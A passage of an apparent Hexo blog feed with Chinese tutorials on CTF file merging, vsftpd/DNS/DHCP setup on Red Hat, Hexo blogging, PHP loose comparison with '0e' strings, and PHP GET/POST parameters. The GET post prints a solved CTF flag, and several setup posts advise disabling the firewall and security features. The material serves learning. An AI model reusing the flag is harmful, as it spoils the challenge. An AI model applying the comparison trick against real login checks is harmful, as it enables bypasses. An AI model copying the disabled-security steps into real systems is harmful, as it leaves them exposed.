start="2"><li>windows环境文件合并</li></ol><p>linux中有cat等命令，windows环境下也有类似的命令copy，使用方式如下：<br>将chapter01、chapter02、chapter03三个文件按从左到右顺序合并，输出到book文件中。<br>所使用的命令：copy /B chapter01+chapter02+chapter03 book<br>将所有以chapter开头的文件按文件名从小到大的顺序合并，输出到book1文件中。<br>所使用的命令：copy /B  chapter* book1 </p><p><img src="https://image.3001.net/images/20190227/1551248579_5c762cc3635bf.jpg!small" alt=""></p><ol start="3"><li>Python文件合并</li></ol><p>python环境适用于linux也适用于windows，它是通过编写脚本来实现的文件合并，以之前的例子来。</p><h1 id="coding-utf8"><a href="#coding-utf8" class="headerlink" title="-- coding: utf8 --"></a>-<em>- coding: utf8 -</em>-</h1><p>def foo():<br>path=r”.\chapter%d”<br>s=””<br>for i in xrange(1,4):<br>f=open(path % i).read()<br>s+=f<br>print s<br>pass<br>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>foo()<br>print ‘ok’</p><p>0×03 总结</p><p>介绍了这么多关于CTF基础类型的文件处理方法，为了方便大家梳理，提供一个思维导图给大家来参考。</p><p><img src="https://image.3001.net/images/20190227/1551248626_5c762cf27a8e8.jpg!small" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;杂项介绍&lt;/p&gt;
&lt;p&gt;Miscellaneous简称MISC，意思是杂项，混杂的意思。&lt;/p&gt;
&lt;p&gt;杂项大致有几种类型：&lt;/p&gt;
&lt;p&gt;1.隐写&lt;/p&gt;
&lt;p&gt;2.压缩包处理&lt;/p&gt;
&lt;p&gt;3.流量分析&lt;/p&gt;
&lt;p&gt;4.攻击取证&lt;/p&gt;
&lt;p&gt;5.其它&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>redhat中FTP服务器配置</title>
    <link href="http://yoursite.com/2019/06/05/redhat%E4%B8%ADFTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/"/>
    <id>http://yoursite.com/2019/06/05/redhat中FTP服务器配置/</id>
    <published>2019-06-05T03:12:29.017Z</published>
    <updated>2019-07-15T11:17:40.087Z</updated>
    
    <content type="html"><![CDATA[<p>FTP(File Transfer Protocol，文件传输协议)是典型的C/S结构的应用层协议，需要由服务端软件、客户端软件两个部分共同实现文件传输功能。FTP连接有两种模式：主动模式（服务器主动发起数据连接）和被动模式（服务器被动等待数据连接）。<br><a id="more"></a><br>下面我将在Redhat6.5中搭建ftp服务，包括匿名用户登录，普通用户身份验证登录，黑名单，虚拟用户登录，并在win7客户端进行登录验证+</p><hr><p>1、在Linux中安装ftp软件包<br><img src="https://s1.51cto.com/images/blog/201805/16/83a70a52fa09cd771573b72f0fe722d5.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p><p>2、开启ftp服务</p><p><img src="https://s1.51cto.com/images/blog/201805/16/8ef356597a35b67238355ca0d18c47e8.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p><p>3、此时便可以在win7中使用匿名用户ftp进行登录，无密码，在此之前需关闭Linux防火墙和安全功能<br><img src="https://s1.51cto.com/images/blog/201805/16/760ee0b1ebbf00c9ebb4ad9ebdb4b0a9.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p><p>4、添加zhangsan和lisi用户，并且可以身份验证访问ftp服务</p><p><img src="https://s1.51cto.com/images/blog/201805/16/c892004534713a21a7451325b5b4c711.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p><p>此时zhangsan，lisi可正常登录ftp，但有缺点就是其可以自由游走，切换目录，安全性较低</p><p><img src="https://s1.51cto.com/images/blog/201805/16/868fadbffd5690242c52e1243c41d667.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p><p>5、编辑ftp配置文件/etc/vsftpd/vsftpd.conf禁锢家目录使登录ftp的用户不可随意切换目录</p><p><img src="https://s1.51cto.com/images/blog/201805/16/a3462f5ac8a8dfc9115ca30c1ac4a0e9.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p><p><img src="https://s1.51cto.com/images/blog/201805/16/02ff76789d0796797ee4371db3ffb111.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p><p>6、将zhangsan加入user_list文件中，user_list默认为黑名单，则zhangsan便不可登录ftp服务，lisi可正常登录</p><p><img src="https://s1.51cto.com/images/blog/201805/16/933c7a68b3b93ac341900765a08b5e9d.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p><p><img src="https://s1.51cto.com/images/blog/201805/16/7671dd1cf3ac3d48cee56355a7e216f0.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p><p>若想uesr_list变为白名单，则只要在ftp配置文件末尾加入：userlist_deny=NO即可<br>7、建立lisa，tom虚拟用户账户使用ftp<br><img src="https://s1.51cto.com/images/blog/201805/16/1ba3e2684aaca68aa18e2c07c18e78ec.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p><p><img src="https://s1.51cto.com/images/blog/201805/16/42ddaf48c2fc0db1a43d174fce0ad88e.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p><p>8、将vuser文件转换成数据库文件，并给vuser和转换后的vuser.db数据库文件设置权限，不让别人看见里面的信息</p><p><img src="https://s1.51cto.com/images/blog/201805/16/eb893b73cbadf68e07fd7303ac88f33b.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p><p>9、创建一个用户为vuser 指定家目录/opt/vuser 并不使用shell登陆<br><img src="https://s1.51cto.com/images/blog/201805/16/b83ae6e23233d7a7140d17ccac24a24b.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p><p>10、编辑pam认证模块支持虚拟用户的登陆，在文件中写入<br>auth required pam_userdb.so db=/etc/vsftpd/vuser<br>account required pam_userdb.so db=/etc/vsftpd/vuser</p><p><img src="https://s1.51cto.com/images/blog/201805/16/9e53056b6fd9349d7aba28be348b6e9b.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p><p><img src="https://s1.51cto.com/images/blog/201805/16/95d830afea6183a2dbb31eb7e56c3148.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p><p>11、编辑ftp配置文件，开启虚拟用户，使用pam认证登陆</p><p><img src="https://s1.51cto.com/images/blog/201805/16/2e3feb9d62fe9861e991ca82a560d087.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p><p>12、重启ftp服务：service vsftpd restart，在win7客户端使用虚拟用户进行登录<br><img src="https://s1.51cto.com/images/blog/201805/16/603e2f2f96c2e7fc3ee944a339359734.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p><p>©著作权归作者所有：来自51CTO博客作者徐星月月月的原创作品，如需转载，请注明出处，否则将追究法律责任</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;FTP(File Transfer Protocol，文件传输协议)是典型的C/S结构的应用层协议，需要由服务端软件、客户端软件两个部分共同实现文件传输功能。FTP连接有两种模式：主动模式（服务器主动发起数据连接）和被动模式（服务器被动等待数据连接）。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基于hexo+github的博客搭建</title>
    <link href="http://yoursite.com/2019/06/04/%E5%9F%BA%E4%BA%8Ehexo-github%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <id>http://yoursite.com/2019/06/04/基于hexo-github的博客搭建/</id>
    <published>2019-06-04T04:57:37.448Z</published>
    <updated>2019-06-04T05:12:16.557Z</updated>
    
    <content type="html"><![CDATA[<p>基于hexo+github搭建一个独立博客<br>阅读目录(Content)</p><a id="more"></a><p>准备工作<br>安装Hexo<br>初始化<br>1.创建仓库<br>2.添加ssh key到Github<br>3.发布文章<br>安装theme<br>绑定个人域名<br>总结和说明<br>一直听说用hexo搭建一个拥有自己域名的博客是很酷炫的事情~，在这十一花上半个小时整个hexo博客岂不美哉。</p><p>使用Hexo吸引我的是，其简单优雅, 而且风格多变, 适合程序员搭建个人博客,而且支持多平台的搭建，再加上有些node,git基础，分分钟创建出一个高大上的博客。废话少说，开始吧。</p><p>准备工作<br>1.node：用来生成静态页面的 到Node.js官网下载相应平台的最新版本，一路安装即可。</p><p>2.git: 把本地的hexo内容提交到github上去.没有安装的可以看此教程。</p><p>3.github：用来做博客的远程创库、域名、服务器。（~不多说了）</p><p>然后你还要知道一点点linux命令，域名解析相关知识（以上条件你都达到了，那么恭喜你30分钟搭建倒计时开始~）</p><p>安装Hexo<br>（本人是Mac系统，其他系统的朋友这部分可以看官网教程）</p><p>当Node.js和Git都安装好后就可以正式安装Hexo了，终端执行如下命令：</p><p>$ sudo npm install -g hexo<br>输入管理员密码即开始安装</p><p>Hexo官网上的安装命令是$ npm install -g hexo-cli，安装时不要忘记前面加上sudo，否则会因为权限问题报错。</p><p>初始化<br>终端cd到一个你选定的目录（比如创建一个blog文件，$cd blog），执行hexo init命令：</p><p>$ hexo init<br>在blog目录下，执行如下命令，安装npm：</p><p>$ npm install<br>执行如下命令，开启hexo服务器：</p><p>$ hexo s<br>此时，浏览器中打开网址<a href="http://localhost:4000，能看到如下页面：" target="_blank" rel="noopener">http://localhost:4000，能看到如下页面：</a><br><img src="https://i.imgur.com/uFPR67T.png" alt=""></p><p>本地设置好后，接下来开始关联Github。</p><p>1.创建仓库<br>登录你的Github帐号，新建仓库，名为用户名.github.io固定写法。<br><img src="https://i.imgur.com/BeVVunS.png" alt=""></p><p>本地的blog文件夹下内容为：</p><p>_config.yml<br>db.json<br>node_modules<br>package.json<br>scaffolds<br>source<br>themes<br>终端cd到blog文件夹下，vim打开_config.yml，命令如下：</p><p>$ vim _config.yml<br>打开后往下滑到最后，修改成下边的样子：</p><p>deploy:<br>    type: git<br>    repository: <a href="https://github.com/MuYunyun/MuYunyun.github.io.git" target="_blank" rel="noopener">https://github.com/MuYunyun/MuYunyun.github.io.git</a><br>    branch: master<br>你需要将repository后MuYunyun换成你自己的用户名　　</p><p>注意坑二：在配置所有的_config.yml文件时（包括theme中的），在所有的冒号:后边都要加一个空格，否则执行hexo命令会报错，切记 切记<br>在blog文件夹目录下执行生成静态页面命令：</p><p>$ hexo generate        或者：hexo g</p><p>此时若出现如下报错：<br>ERROR Local hexo not found in ~/blog<br>ERROR Try runing: ‘npm install hexo –save’<br>则执行命令：<br>npm install hexo –save<br>若无报错，自行忽略此步骤。<br>复制代码<br>再执行配置命令：</p><p>$ hexo deploy            或者：hexo d<br>注意坑三：若执行命令hexo deploy仍然报错：无法连接git或找不到git，则执行如下命令来安装hexo-deployer-git：</p><p>$ npm install hexo-deployer-git –save<br>若你未关联Github，则执行hexo deploy命令时终端会提示你输入Github的用户名和密码，即</p><p>Username for ‘<a href="https://github.com&#39;" target="_blank" rel="noopener">https://github.com&#39;</a>:<br>Password for ‘<a href="https://github.com&#39;" target="_blank" rel="noopener">https://github.com&#39;</a>:<br>hexo deploy命令执行成功后，浏览器中打开网址<a href="http://MuYunyun.github.io（将MuYunyun换成你的用户名）能看到和打开http://localhost:4000时一样的页面。" target="_blank" rel="noopener">http://MuYunyun.github.io（将MuYunyun换成你的用户名）能看到和打开http://localhost:4000时一样的页面。</a>　<br><img src="https://i.imgur.com/ytGMTgA.png" alt=""></p><p>为避免每次输入Github用户名和密码的麻烦，可参照第二节方法</p><p>回到顶部(go to top)<br>2.添加ssh key到Github<br>1.1.检查SSH keys是否存在Github</p><p>执行如下命令，检查SSH keys是否存在。如果有文件id_rsa.pub或id_dsa.pub，则直接进入步骤1.3将SSH key添加到Github中，否则进入下一步生成SSH key。</p><p>$ ls -al ~/.ssh<br>1.2.生成新的ssh key</p><p>执行如下命令生成public/private rsa key pair，注意将<a href="mailto:your_email@example.com" target="_blank" rel="noopener">your_email@example.com</a>换成你自己注册Github的邮箱地址。</p><p>$ ssh-keygen -t rsa -C “<a href="mailto:your_email@example.com" target="_blank" rel="noopener">your_email@example.com</a>“<br>默认会在相应路径下（~/.ssh/id_rsa.pub）生成id_rsa和id_rsa.pub两个文件。</p><p>1.3.将ssh key添加到Github中</p><p>Find前往文件夹~/.ssh/id_rsa.pub打开id_rsa.pub文件，里面的信息即为SSH key，将这些信息复制到Github的Add SSH key页面即可。</p><p>进入Github –&gt; Settings –&gt; SSH keys –&gt; add SSH key:</p><p>Title里任意添一个标题，将复制的内容粘贴到Key里，点击下方Add key绿色按钮即可。</p><p>回到顶部(go to top)<br>3.发布文章<br>终端cd到blog文件夹下，执行如下命令新建文章：</p><p>hexo new “postName”<br>名为postName.md的文件会建在目录/blog/source/_posts下。</p><p>文章编辑完成后，终端cd到blog文件夹下，执行如下命令来发布: </p><p>hexo generate             //生成静态页面<br>hexo deploy            //将文章部署到Github</p><p>回到顶部(go to top)<br>安装theme<br>你可以到Hexo官网主题页去搜寻自己喜欢的theme。这里以hexo-theme-next为例</p><p>终端cd到 blog 目录下执行如下命令：</p><p>$ git clone <a href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="noopener">https://github.com/iissnan/hexo-theme-next</a> themes/next<br>将blog目录下_config.yml里theme的名称landscape修改为next</p><p>终端cd到blog目录下执行如下命令(每次部署文章的步骤)：</p><p>$ hexo clean           //清除缓存文件 (db.json) 和已生成的静态文件 (public)<br>$ hexo g             //生成缓存和静态文件<br>$ hexo d             //重新部署到服务器<br>至于更改theme内容，比如名称，描述，头像等去修改blog/_config.yml文件和blog/themes/next/_config.yml文件中对应的属性名称即可，不要忘记冒号:后加空格。NexT 使用文档里有极详细的介绍。</p><p>回到顶部(go to top)<br>绑定个人域名<br>首先假设你有一个域名并且是可用状态。修改你域名的DNS地址为 f1g1ns1.dnspod.net和f1g1ns2.dnspod.net<br><img src="https://i.imgur.com/4IkHth3.png" alt=""></p><p>现在使用的域名是Github提供的二级域名，也可以绑定为自己的个性域名。购买域名，我是在万网买的，可直接在其网站做域名解析。</p><p>1.Github端</p><p>在/blog/themes/landscape/source目录下新建文件名为：CNAME文件，注意没有后缀名！直接将自己的域名如：muyunyun.cn写入。</p><p>终端cd到blog目录下执行如下命令重新部署：</p><p>$ hexo clean<br>$ hexo g<br>$ hexo d<br> 注意坑四<br>2.域名解析</p><p>如果将域名指向一个域名，实现与被指向域名相同的访问效果，需要增加CNAME记录。登录万网，在你购买的域名后边点击：解析 –&gt; 添加解析</p><p>记录类型：CNAME</p><p>主机记录：将域名解析为example.com（不带www），填写@或者不填写</p><p>记录值：MuYunyun.github.io. (不要忘记最后的.，MuYunyun改为你自己的用户名)，点击保存即可，如下图：</p><p><img src="https://i.imgur.com/ySJRIn4.png" alt=""></p><p>1<br>ps:万网DNS地址更换貌似需要一段时间才能生效，如果不能访问请晚点或者隔天再访问域名，如果还是不行可能就是出问题了。<br>铛铛铛，点击MuYunyun.github.io和访问<a href="http://muyunyun.cn/访问效果一致" target="_blank" rel="noopener">http://muyunyun.cn/访问效果一致</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;基于hexo+github搭建一个独立博客&lt;br&gt;阅读目录(Content)&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>redhat中DNS服务器配置</title>
    <link href="http://yoursite.com/2019/06/03/redhat%E4%B8%ADDNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/"/>
    <id>http://yoursite.com/2019/06/03/redhat中DNS服务器配置/</id>
    <published>2019-06-03T13:15:28.176Z</published>
    <updated>2019-06-03T13:27:10.267Z</updated>
    
    <content type="html"><![CDATA[<p>Redhat6.5中搭建DNS域名解析服务<br>DNS系统在网络中的作用就是维护着一个地址数据库，其中记录了各种主机域名与IP地址的对应关系，以便为客户程序提供正向或反向的地址查询服务。<br>下面我将在Redhat6.5中搭建DNS域名解析服务，包括正向解析，反向解析。<br>正向解析</p><a id="more"></a><hr><p>1、安装bind软件包，bind软件包提供了域名服务的主要程序和相关文件。<br>Redhat6.5中搭建DNS域名解析服务<br><img src="https://s1.51cto.com/images/blog/201805/18/9a5e44eb1e49f51172ca655528b9c8b8.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>2、bind安装完成，可以使用rpm -qc bind显示bind软件包安装的配置文件<img src="https://s1.51cto.com/images/blog/201805/18/19d0fc5e30013dd12f0b0dbf5e6944fe.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p><p>3、编辑主配置文件，修改监听地址为提供DNS服务的主机IP地址，我本次实验为本机IP地址，allow-query改成any表示所有网段都允许访问<br><img src="https://s1.51cto.com/images/blog/201805/18/c775538ecc755f60622219d35b31172a.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>4、编辑区域配置文件，file指定区域数据配置文件，正向解析的区域数据配置文件后缀名为zone，反向解析的文件名后缀为local<br><img src="https://s1.51cto.com/images/blog/201805/18/a3e61c6a5c4c11c5656c0f0d957b1067.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>5、编辑区域数据配置文件，可先复制模板但要保留文件原有属性，使用cp -p命令<img src="https://s1.51cto.com/images/blog/201805/18/a00833b920b01a7c3c53b955a86a02a6.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br><img src="https://s1.51cto.com/images/blog/201805/18/141e46784ba7dd58b6edbc4f0bf03158.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p><p>6、开启服务，将DNS服务器地址写入/etc/resolv.conf文件中，便可使用host命令进行解析<br><img src="https://s1.51cto.com/images/blog/201805/18/ba97285f3e7e798521c614196ef8a605.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>7、此外，在同网段的win7系统上同样可以进行解析，在此之前需关闭Linux防火墙和安全功能，使用nslookup命令<br><img src="https://s1.51cto.com/images/blog/201805/18/a732ca3c10f5fd7238fbc67812abadd6.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br><img src="https://s1.51cto.com/images/blog/201805/18/71926dafdafac8e28b521e09ce031e12.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>反向解析<br>1、修改区域配置文件<br><img src="https://s1.51cto.com/images/blog/201805/18/ccc0d5cea09b73704f0ddc31bb1c08ca.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>2、修改区域数据配置文件<br><img src="https://s1.51cto.com/images/blog/201805/18/eb308a01b1024fc50de13f954fa37dc1.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>3、验证反向解析<br><img src="https://s1.51cto.com/images/blog/201805/18/72c7422e9b12e0ddf3f2268dafc68781.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br><img src="https://s1.51cto.com/images/blog/201805/18/128e6ff1961b99508c5c310d3167dd13.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Redhat6.5中搭建DNS域名解析服务&lt;br&gt;DNS系统在网络中的作用就是维护着一个地址数据库，其中记录了各种主机域名与IP地址的对应关系，以便为客户程序提供正向或反向的地址查询服务。&lt;br&gt;下面我将在Redhat6.5中搭建DNS域名解析服务，包括正向解析，反向解析。&lt;br&gt;正向解析&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PHP弱类型</title>
    <link href="http://yoursite.com/2019/05/25/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
    <id>http://yoursite.com/2019/05/25/PHP弱类型/</id>
    <published>2019-05-25T06:42:01.613Z</published>
    <updated>2019-05-25T06:50:26.572Z</updated>
    
    <content type="html"><![CDATA[<h2 id="弱等于-“-”"><a href="#弱等于-“-”" class="headerlink" title="弱等于 “==”"></a>弱等于 “==”</h2><ol><li>== 在进行比较的时候，会先将字符串类型转化成相同，再比较。<blockquote><p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p><a id="more"></a><p>例如：</p><p>&lt;?php<br>var_dump(“admin”==0);  //true</p></blockquote></li></ol><blockquote><p>var_dump(“1admin”==1); //true</p></blockquote><blockquote><p>var_dump(“admin1”==1) //false</p></blockquote><blockquote><p>var_dump(“admin1”==0) //true</p></blockquote><blockquote><p>var_dump(“0e123456”==”0e4456789”); //true </p></blockquote><blockquote><p>?&gt; </p></blockquote><ul><li>1 观察上述代码，”admin”==0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0自然和0相等</li><li>2 “1admin”==1 比较的时候会将1admin转化成数值,结果为1，而“admin1“==1 却等于错误，也就是”admin1”被转化成了0,为什么呢？</li></ul><blockquote><ul><li>3 “0e123456”==”0e456789”相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等</li></ul></blockquote><hr><p>所以，当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内<br>该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;弱等于-“-”&quot;&gt;&lt;a href=&quot;#弱等于-“-”&quot; class=&quot;headerlink&quot; title=&quot;弱等于 “==”&quot;&gt;&lt;/a&gt;弱等于 “==”&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;== 在进行比较的时候，会先将字符串类型转化成相同，再比较。&lt;blockquote&gt;
&lt;p&gt;如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>-GET与-POST</title>
    <link href="http://yoursite.com/2019/05/24/-GET%E4%B8%8E-POST/"/>
    <id>http://yoursite.com/2019/05/24/-GET与-POST/</id>
    <published>2019-05-24T11:29:16.793Z</published>
    <updated>2019-05-24T12:31:28.758Z</updated>
    
    <content type="html"><![CDATA[<p>在 PHP 中，预定义的 $_GET 变量用于收集来自 method=”get” 的表单中的值。<br><a id="more"></a></p><h2 id="GET-变量"><a href="#GET-变量" class="headerlink" title="$_GET 变量"></a>$_GET 变量</h2><p>预定义的 $_GET 变量用于收集来自 method=”get” 的表单中的值。</p><p>从带有 GET 方法的表单发送的信息，对任何人都是可见的（<strong>会显示在浏览器的地址栏</strong>），并且对发送信息的量也有限制。</p><ul><li>通过 $_GET 变量来收集表单数据</li></ul><blockquote><p>在 HTML 表单中使用 method=”get” 时，所有的变量名和值都会显示在 URL 中。</p></blockquote><blockquote><p>注释：所以在发送密码或其他敏感信息时，不应该使用这个方法！</p></blockquote><blockquote><p>然而，正因为变量显示在 URL 中，因此可以在收藏夹中收藏该页面。在某些情况下，这是很有用的。</p></blockquote><blockquote><p>注释：HTTP GET 方法不适合大型的变量值。它的值是不能超过 2000 个字符的。</p></blockquote><ul><li>在URL后直接写入要传入的参数的值如：<blockquote><p><a href="http://123.206.87.240:8002/get/" target="_blank" rel="noopener">http://123.206.87.240:8002/get/</a><br><a href="http://123.206.87.240:8002/get/?what=flag" target="_blank" rel="noopener">http://123.206.87.240:8002/get/?what=flag</a></p></blockquote></li></ul><p>得到:</p><p>$what=$_GET[‘what’]; </p><p>echo $what;</p><p>if($what==’flag’)</p><p>echo ‘flag{<em>**</em>}’;</p><p>flagflag{bugku_get_su8kej2en}</p><p>##$_POST##</p><ul><li>_POST传参时，直接抓包。在数据段直接输入要传入的参数的值</li><li>注意：在写入数据时要在前面添加<blockquote><p>Content-type: application/x-www-form-urlencode(或者其他）</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在 PHP 中，预定义的 $_GET 变量用于收集来自 method=”get” 的表单中的值。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>redhat配置DHCP服务器</title>
    <link href="http://yoursite.com/2019/05/23/redhat%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://yoursite.com/2019/05/23/redhat配置DHCP服务器/</id>
    <published>2019-05-23T12:54:00.086Z</published>
    <updated>2019-05-23T12:56:43.873Z</updated>
    
    <content type="html"><![CDATA[<p>1.由于虚拟机也提供了dhcp服务，因此用nat或host-only时会选用虚拟机的dhcp服务，因此要在虚拟网络编辑器中取消分配dhcp<br><a id="more"></a><br>2.移除virbr0虚拟网卡；<br><a href="https://blog.csdn.net/csdn_immortal/article/details/81068259" target="_blank" rel="noopener">https://blog.csdn.net/csdn_immortal/article/details/81068259</a></p><p>3.配置静态ip，要与dhcp子网在同一网段；</p><pre><code>vi /etc/sysconfig/network-scripts/ifcfg-ethxxxx</code></pre><p>修改内容：</p><pre><code>BOOTPROTO=staticIPADDR=192.168.2.5GATEWAY=192.168.2.1</code></pre><p>4.配置dhcp</p><pre><code>vi /etc/dhcp/dhcpd.conf</code></pre><p>修改后内容如下：</p><pre><code>ddns-update-style interim;ignore client-updates;subnet 192.168.2.0 netmask 255.255.255.0 {# --- default gateway        option routers 192.168.2.1;        option subnet-mask 255.255.255.0;        range dynamic-bootp 192.168.2.50 192.168.2.60;        default-lease-time 21600;        max-lease-time 43200;}                                                                  </code></pre><p>5.开始用service dhcpd start启动dhcp，但出现Redirecting to /bin/systemctl start  dhcpd.service;</p><p>改用systemctl start dhcpd.service启动dhcp服务</p><p>用systemctl status dhcpd.service查看服务状态</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;1.由于虚拟机也提供了dhcp服务，因此用nat或host-only时会选用虚拟机的dhcp服务，因此要在虚拟网络编辑器中取消分配dhcp&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>javac配置</title>
    <link href="http://yoursite.com/2019/05/23/javac%E9%85%8D%E7%BD%AE/"/>
    <id>http://yoursite.com/2019/05/23/javac配置/</id>
    <published>2019-05-23T09:03:02.710Z</published>
    <updated>2019-05-23T09:25:15.281Z</updated>
